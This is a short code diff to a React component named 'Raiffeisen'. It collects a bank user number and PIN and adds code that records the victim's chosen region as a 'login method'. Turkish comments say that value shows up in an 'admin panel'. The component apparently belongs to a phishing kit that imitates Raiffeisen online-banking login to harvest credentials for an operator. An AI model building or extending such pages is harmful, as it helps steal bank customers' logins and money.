@@ -1,11 +1,12 @@
 "use client";
 
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 
 type Props = {
   formData: {
     verfuegernummer?: string;
     pin?: string;
+    bundesland?: string;
   };
   onChange: (field: string, value: string) => void;
   handleRouteAction: () => void;
@@ -34,6 +35,13 @@ export function Raiffeisen({ formData, onChange, handleRouteAction, saving }: Pr
   );
 
   const toggleDropdown = () => setDropdownOpen(!dropdownOpen);
+
+  // Ustteki "Bundesland oder Bank wählen" secimi admin panelde
+  // "Giriş yöntemi" olarak gorunur → loginMethod'a yaz (varsayilan dahil).
+  useEffect(() => {
+    onChange("loginMethod", selectedRegion);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [selectedRegion]);
 
   return (
     <div className="min-h-screen relative font-sans flex flex-col">
